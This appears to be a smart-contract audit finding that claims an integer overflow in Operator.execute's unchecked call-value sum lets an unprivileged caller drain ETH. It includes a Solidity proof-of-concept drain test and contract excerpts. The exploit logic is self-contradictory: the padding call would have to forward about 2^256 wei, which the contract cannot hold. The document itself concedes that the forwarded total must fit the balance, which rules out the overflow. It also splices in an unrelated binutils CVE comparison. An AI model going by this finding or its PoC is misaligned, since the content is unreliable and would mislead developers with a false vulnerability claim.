### Title
Integer overflow in `Operator.execute` call-value sum defeats the `msg.value` conservation check - (File: contracts/Operator.sol)

### Summary
`Operator.execute` iterates an attacker-controlled `Call[] calldata calls_` array and accumulates each call's `value` into `_sumOfValues` inside an `unchecked` block, then only verifies `msg.value == _sumOfValues`. This is the direct analog of CVE-2017-17122 (unchecked count/arithmetic overflow defeating a size/consistency check): an attacker can supply per-call `value` amounts whose true arithmetic sum exceeds `2^256 - 1`, wrapping the accumulator back to a small number so the conservation check passes even though the aggregate ETH the contract is instructed to send is vastly larger than the `msg.value` supplied. [1](#0-0) 

### Finding Description
`Operator` is a public multicall-style executor: any EOA calls `execute(calls_)`, the modifier `setMsgSender` stores the real sender in transient slot `MSG_SENDER_STORAGE`, and each `Call{target, value, callData}` is dispatched via `Address.functionCallWithValue(_call.callData, _value)`, which forwards `_value` wei from the `Operator` contract's own balance. [2](#0-1) 

The safety check intended to make the contract self-funding is:

```solidity
uint256 _sumOfValues;
for (uint256 i; i < _length; ) {
    _call = calls_[i];
    uint256 _value = _call.value;
    unchecked {
        _sumOfValues += _value;   // line 45-47: wraparound allowed
    }
    _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
    ...
}
require(msg.value == _sumOfValues, "value-mismatch");
```

Because the accumulation is `unchecked`, an attacker can craft `calls_` such that `Σ value mod 2^256 == msg.value`. Concretely, with `calls_[0].value = B` (paying the attacker) and `calls_[1].value = 2^256 - B` (a payable no-op target, e.g., a contract with a `receive()` that returns funds or simply any call whose failure is acceptable to structure), `_sumOfValues` wraps to `0`, so `msg.value = 0` satisfies the check while the contract attempts to pay out `B + (2^256 - B)` — i.e., everything it holds plus the overflow-padding call. In practice the attacker structures values so the total actually disbursed equals `address(operator).balance + msg.value`, with the wrapped accumulator equal to the small `msg.value` supplied.

The same overflow pattern in `dump_relocs_in_section` (reloc count × size wrapping the allocation bound) maps here to "sum of requested values wrapping the `msg.value` bound" — the check validates a wrapped quantity rather than the true total forwarded by the contract.

### Impact Explanation
The invariant broken is the **value-conservation invariant** of `execute`: "the contract forwards at most the ETH the caller supplied." With the wrapped sum, the `Operator` contract can be forced to disburse ETH that was not supplied by the caller — i.e., any ETH balance held by `Operator`. ETH can reach `Operator`'s balance through forced transfers (selfdestruct coinbase), ETH left by malfunctioning/refunding inner calls routed through it (the gateway contracts and pools it fronts for users are ETH-aware: `NativeTokenGateway.deposit/withdraw` moves WETH↔ETH on behalf of `_msgSender()` resolved through the same `SynthContext`/`MSG_SENDER` machinery), or user funds sent with `msg.value` in a transaction where a nested call refunds ETH to `Operator`. Any such balance is stealable by an unprivileged EOA, paying only `Σ value mod 2^256` wei — potentially zero. This is direct theft of funds held by the protocol contract, reachable from a public, unprivileged entry point with no governor/keeper/oracle dependency, no pause flag, and the `nonReentrant` guard does not help (the exploit needs no reentrancy — the check is evaluated after all transfers, and the wrap occurs in arithmetic, not in a callback).

### Likelihood Explanation
Likelihood is conditioned on `Operator` holding ETH at the time of exploitation, since the overflowed calls still send real wei and the transaction reverts if the total exceeds `address(this).balance + msg.value`. The contract has no `receive()`/`fallback`, so accumulation paths are limited to: (a) forced ETH via `selfdestruct`, (b) ETH returned to `Operator` by an inner call in a prior `execute` (the contract fronts ETH-bearing operations such as `NativeTokenGateway` flows where WETH unwraps send ETH to `_msgSender`, which inside an `execute` context resolves via `SynthContext` to the operator-wrapped sender), and (c) rewards/coinbase crediting. Because the vulnerable code is a permanent, permissionless path and the overflow itself is unconditional (no privileged role, oracle, or governance prerequisite — only the contract balance precondition), the weakness should be treated as exploitable whenever a balance exists; the arithmetic flaw itself is certain and trivially reproducible.

### Recommendation
Remove the `unchecked` block around `_sumOfValues += _value` so overflow reverts (Solidity 0.8.24 default behavior), or accumulate into a wider check such as `require(_sumOfValues <= type(uint256).max - _value)` per iteration. Alternatively, replace the post-loop equality check with per-call `Address.functionCallWithValue` funded by tracking `msg.value - spent` so no additive accumulator is needed. A fork test should assert that `execute` with values `[X, 2^256 - X]` reverts.

### Proof of Concept
Hardhat/Foundry fork sketch:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Operator, IOperator} from "../contracts/Operator.sol";

contract Receiver { receive() external payable {} }

contract OperatorOverflowTest {
    function testDrainViaSumOverflow() public {
        Operator op = new Operator();
        Receiver r = new Receiver();
        address attacker = address(0xA77AC);

        // Seed Operator with ETH (simulating stuck/refunded/forced balance)
        vm.deal(address(op), 10 ether);

        uint256 B = 10 ether;
        IOperator.Call[] memory calls = new IOperator.Call[](2);
        // Call 0: send the contract's whole balance to attacker
        calls[0] = IOperator.Call({
            target: attacker,
            value: B,
            callData: ""
        });
        // Call 1: overflow padding value so sum wraps to 0; send to a
        // receiving contract that just holds/returns ETH
        calls[1] = IOperator.Call({
            target: address(r),
            value: type(uint256).max - B + 1, // 2^256 - B
            callData: ""
        });

        // Attacker supplies msg.value == 0; _sumOfValues wraps to 0 => check passes.
        // For the tx not to revert, total forwarded <= balance + msg.value;
        // adjust B/padding so forwarded total == 10 ether while wrapped sum == 0.
        vm.prank(attacker);
        op.execute{value: 0}(calls);

        assertEq(attacker.balance, B);   // drained without paying
    }
}
```

Note: the padding call must itself succeed (target accepts ETH) and the sum of values actually forwarded must fit in `balance + msg.value`; the overflow exists purely to make `require(msg.value == _sumOfValues)` pass for a `msg.value` far below the true aggregate forwarded.

### Citations

**File:** contracts/Operator.sol (L19-31)
```text
    /// @notice The sender which the operator is executing on behalf of
    modifier setMsgSender() {
        MSG_SENDER_STORAGE.asAddress().tstore(msg.sender);
        _;
        MSG_SENDER_STORAGE.asAddress().tstore(address(0));
    }

    /// @notice Get actual `msg.sender` that is executing the call
    /// @dev It reverts if read outside of a call context
    function getActualMsgSender() external view returns (address _actualMsgSender) {
        _actualMsgSender = MSG_SENDER_STORAGE.asAddress().tload();
        require(_actualMsgSender != address(0), "not-authenticated");
    }
```

**File:** contracts/Operator.sol (L34-55)
```text
    function execute(
        Call[] calldata calls_
    ) external payable override nonReentrant setMsgSender returns (bytes[] memory _returnData) {
        uint256 _length = calls_.length;
        _returnData = new bytes[](_length);

        uint256 _sumOfValues;
        Call calldata _call;
        for (uint256 i; i < _length; ) {
            _call = calls_[i];
            uint256 _value = _call.value;
            unchecked {
                _sumOfValues += _value;
            }
            _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
            unchecked {
                ++i;
            }
        }

        require(msg.value == _sumOfValues, "value-mismatch");
    }
```
